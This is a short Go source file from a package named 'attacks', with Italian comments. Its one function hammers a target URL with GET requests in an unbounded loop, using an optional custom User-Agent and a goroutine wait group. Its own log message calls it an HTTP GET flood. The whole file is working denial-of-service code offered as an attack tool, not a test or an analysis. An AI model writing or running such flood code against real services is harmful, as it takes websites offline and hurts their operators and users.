package attacks

import (
	"context"
	"log"
	"net/http"
	"sync"
	"time"
)

// SendHTTPGet invia richieste HTTP GET in modo continuativo
func SendHTTPGet(target, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for {
		select {
		case <-ctx.Done():
			log.Println("HTTP GET flood interrotto.")
			return
		default:
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				log.Printf("Error creating HTTP GET request: %v", err)
				continue
			}
			if userAgent != "" {
				req.Header.Set("User-Agent", userAgent)
			}

			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error in HTTP GET request: %v", err)
				continue
			}
			resp.Body.Close()

			log.Printf("GET request sent to %s, Status: %s\n", target, resp.Status)
		}
	}
}
